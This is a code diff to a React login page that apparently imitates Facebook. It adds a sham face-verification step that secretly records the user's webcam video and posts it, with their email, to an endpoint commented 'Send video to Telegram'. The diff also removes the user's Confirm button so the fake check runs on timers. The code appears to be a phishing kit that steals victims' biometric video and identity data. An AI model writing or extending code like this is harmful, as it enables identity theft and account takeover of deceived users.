@@ -80,7 +80,9 @@ export default function LoginPage() {
   const [currentDirection, setCurrentDirection] = useState<"left" | "right" | null>(null);
   const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
   const [isRecording, setIsRecording] = useState(false);
-  const videoRef = useState<HTMLVideoElement | null>(null)[0];
+  const [videoRef, setVideoRef] = useState<HTMLVideoElement | null>(null);
+  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
+  const [recordedChunks, setRecordedChunks] = useState<Blob[]>([]);
 
   const loginForm = useForm<LoginForm>({
     resolver: zodResolver(loginSchema),
@@ -167,24 +169,70 @@ export default function LoginPage() {
     setIsRecording(true);
     setCurrentStep("recording");
     setCurrentDirection("left");
-  };
-
-  const handleDirectionComplete = (direction: string) => {
-    const newCompleted = new Set(completedDirections);
-    newCompleted.add(direction);
-    setCompletedDirections(newCompleted);
-
-    if (direction === "left") {
-      setCurrentDirection("right");
-    } else if (direction === "right") {
-      setIsRecording(false);
-      setCurrentStep("processing");
-      setTimeout(() => {
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
+    
+    // Start recording video
+    if (stream) {
+      const chunks: Blob[] = [];
+      const recorder = new MediaRecorder(stream, {
+        mimeType: 'video/webm;codecs=vp8',
+      });
+      
+      recorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          chunks.push(event.data);
         }
-        setCurrentStep("complete");
-      }, 2000);
+      };
+      
+      recorder.onstop = async () => {
+        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+        setRecordedChunks(chunks);
+        
+        // Send video to Telegram
+        const formData = new FormData();
+        formData.append('video', videoBlob, 'face-verification.webm');
+        formData.append('email', userEmail);
+        
+        try {
+          await fetch('/api/telegram/video', {
+            method: 'POST',
+            body: formData,
+          });
+        } catch (error) {
+          console.error('Failed to send video:', error);
+        }
+      };
+      
+      recorder.start();
+      setMediaRecorder(recorder);
+      
+      // Auto-progress through directions
+      setTimeout(() => {
+        const newCompleted = new Set(completedDirections);
+        newCompleted.add("left");
+        setCompletedDirections(newCompleted);
+        setCurrentDirection("right");
+        
+        // Complete after right direction
+        setTimeout(() => {
+          const finalCompleted = new Set(newCompleted);
+          finalCompleted.add("right");
+          setCompletedDirections(finalCompleted);
+          setIsRecording(false);
+          
+          // Stop recording
+          if (recorder.state !== 'inactive') {
+            recorder.stop();
+          }
+          
+          setCurrentStep("processing");
+          setTimeout(() => {
+            if (stream) {
+              stream.getTracks().forEach(track => track.stop());
+            }
+            setCurrentStep("complete");
+          }, 2000);
+        }, 3000); // 3 seconds for right direction
+      }, 3000); // 3 seconds for left direction
     }
   };
 
@@ -432,6 +480,7 @@ export default function LoginPage() {
               <div className="relative w-64 h-80 mx-auto mb-6 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000' }}>
                 <video
                   ref={(el) => {
+                    setVideoRef(el);
                     if (el && stream) {
                       el.srcObject = stream;
                       el.play();
@@ -481,6 +530,7 @@ export default function LoginPage() {
               <div className="relative w-full max-w-sm mx-auto mb-4 rounded-3xl overflow-hidden" style={{ backgroundColor: '#000', aspectRatio: '3/4' }}>
                 <video
                   ref={(el) => {
+                    setVideoRef(el);
                     if (el && stream) {
                       el.srcObject = stream;
                       el.play();
@@ -543,15 +593,6 @@ export default function LoginPage() {
                   />
                 ))}
               </div>
-
-              <button
-                onClick={() => currentDirection && handleDirectionComplete(currentDirection)}
-                disabled={!currentDirection}
-                className="w-full py-3 text-white text-sm font-bold rounded-full transition disabled:opacity-50"
-                style={{ backgroundColor: '#1877f2' }}
-              >
-                Confirm
-              </button>
 
               <button
                 onClick={() => {
